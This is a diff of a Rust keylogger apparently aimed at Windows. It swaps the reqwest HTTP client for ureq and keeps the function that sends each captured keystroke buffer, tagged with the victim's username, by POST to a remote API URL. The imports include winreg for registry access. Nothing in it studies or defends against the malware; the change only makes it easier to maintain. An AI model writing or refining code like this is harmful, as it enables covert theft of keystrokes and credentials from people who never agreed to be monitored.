@@ -11,7 +11,6 @@ use std::env;
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::{Command, exit};
-use reqwest::blocking::Client;
 use winreg::enums::*;
 use winreg::RegKey;
 use rand::Rng;
@@ -68,10 +67,6 @@ fn main() {
 fn run_keylogger() {
     let mut buffer = String::new();
     let mut prev_state = KeyState::new();
-    let client = Client::builder()
-        .timeout(Duration::from_secs(10))
-        .build()
-        .unwrap_or_else(|_| Client::new());
 
     let username = env::var("USERNAME").unwrap_or_else(|_| String::from("unknown"));
 
@@ -148,7 +143,7 @@ fn run_keylogger() {
 
         // Send immediately when buffer has content
         if !buffer.is_empty() {
-            let _ = send_key_logs(&client, &buffer, &username);
+            let _ = send_key_logs(&buffer, &username);
             buffer.clear();
         }
 
@@ -156,13 +151,11 @@ fn run_keylogger() {
     }
 }
 
-fn send_key_logs(client: &Client, buffer: &str, username: &str) -> Result<(), Box<dyn std::error::Error>> {
+fn send_key_logs(buffer: &str, username: &str) -> Result<(), Box<dyn std::error::Error>> {
     let url = format!("{}?username={}", API_URL, username);
-    let _ = client
-        .post(&url)
-        .body(buffer.to_string())
-        .header("Content-Type", "text/plain")
-        .send();
+    let _ = ureq::post(&url)
+        .set("Content-Type", "text/plain")
+        .send_string(buffer);
     Ok(())
 }
 
